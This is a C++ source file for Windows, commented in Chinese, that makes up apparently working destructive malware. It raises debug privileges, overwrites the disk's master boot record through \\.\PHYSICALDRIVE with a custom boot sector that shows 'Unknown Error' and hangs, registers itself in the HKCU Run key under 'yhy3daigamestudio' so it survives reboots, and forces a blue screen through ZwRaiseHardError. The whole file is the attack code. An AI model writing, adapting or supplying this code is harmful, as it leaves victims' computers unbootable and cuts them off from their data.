#include"std.h"

#include <TlHelp32.h>
#include"type.h"

using namespace std;
//自定义MBR
char pMBR[512] = { 0xB8,0x11,0x00,0xCD,0x10,0xBD,0x18,0x7C,0xB9,/*字符位数*/0x00,0x00,0xB8,0x01,0x13,0xBB,0x0C,0x00,0xBA,0x00,0x00,0xCD,0x10,0xEB,0xFE };
const char* msgstr = "Unknown Error";
void GetPrivileges()
{
	//定义一个PLUID
	HANDLE hProcess;
	HANDLE hTokenHandle;
	TOKEN_PRIVILEGES tp;
	hProcess = GetCurrentProcess();//获取当前进程的句柄

	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenHandle);
	//函数查看系统权限的特权值，返回信息到一个LUID结构体里。
	tp.PrivilegeCount = 1;
	LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &tp.Privileges[0].Luid);
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	AdjustTokenPrivileges(hTokenHandle, FALSE, &tp, sizeof(tp), NULL, NULL);
	CloseHandle(hTokenHandle);
	CloseHandle(hProcess);

}

//改MBR
void ReadPHYSICALDRIVE(unsigned int id)
{
	//改MBR中字符位数
	pMBR[9] = static_cast<BYTE>(strlen(msgstr));
	//加循环逻辑锁
	pMBR[0x1BF] = 0x00;
	pMBR[0x1C2] = 0x05;
	//加结尾
	pMBR[510] = 0x55;
	pMBR[511] = 0xAA;
	//把提示字符写入MBR
	strcpy_s(reinterpret_cast<char*>(pMBR + 24), 512, msgstr);

	
	TCHAR DriveName[32];
	swprintf_s(DriveName,32,_T("\\\\.\\PHYSICALDRIVE%d"),id);
	//
	HANDLE hFile;
	hFile = CreateFile(DriveName, GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	//用readfile来读取MBR
	WriteFile(hFile, pMBR, 512, NULL, NULL);

}

void RegAutoStart()
{
	HKEY hKey;
	wstring strRegPath = _T("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
	//1、找到系统的启动项  
	if (RegOpenKeyEx(HKEY_CURRENT_USER, strRegPath.c_str(), 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) ///打开启动项       
	{
		//2、得到本程序自身的全路径
		TCHAR strExeFullDir[MAX_PATH];
		GetModuleFileName(NULL, strExeFullDir, MAX_PATH);
		//3、判断注册表项是否已经存在
		TCHAR strDir[MAX_PATH] = {};
		DWORD nLength = MAX_PATH;
		long result = RegGetValue(hKey, nullptr, _T("yhy3daigamestudio"), RRF_RT_REG_SZ, 0, strDir, &nLength);
		//4、已经存在
		if (result != ERROR_SUCCESS || _tcscmp(strExeFullDir, strDir) != 0)
		{
			//5、添加一个子Key,并设置值
			RegSetValueEx(hKey, _T("yhy3daigamestudio"), 0, REG_SZ, (LPBYTE)strExeFullDir, (lstrlen(strExeFullDir) + 1) * sizeof(TCHAR));
			//6、关闭注册表
			RegCloseKey(hKey);
		}
	}
}

//蓝屏函数
void MakeBlueScreen()
{
	HMODULE ntdll = LoadLibrary(_T("ntdll.dll"));
	if (ntdll != NULL)
	{
		FARPROC RtlAdjPriv = GetProcAddress(ntdll, "RtlAdjustPrivilege");
		FARPROC RtlSetProcessIsCritical = GetProcAddress(ntdll, "RtlSetProcessIsCritical");
		FARPROC ZwRaiseHardErr = GetProcAddress(ntdll, "ZwRaiseHardError");//获取蓝屏函数
		unsigned char ErrKill;
		long unsigned int HDErr;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjPriv)(0x13, true, false, &ErrKill);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))ZwRaiseHardErr)(0xc0000233, 0, 0, 0, 6, &HDErr);
	}

}


void PlaySoundFile(wstring soundname,bool sync)
{
	PlaySound(soundname.c_str(), NULL, SND_FILENAME | (sync? SND_SYNC :SND_ASYNC) | SND_LOOP);
}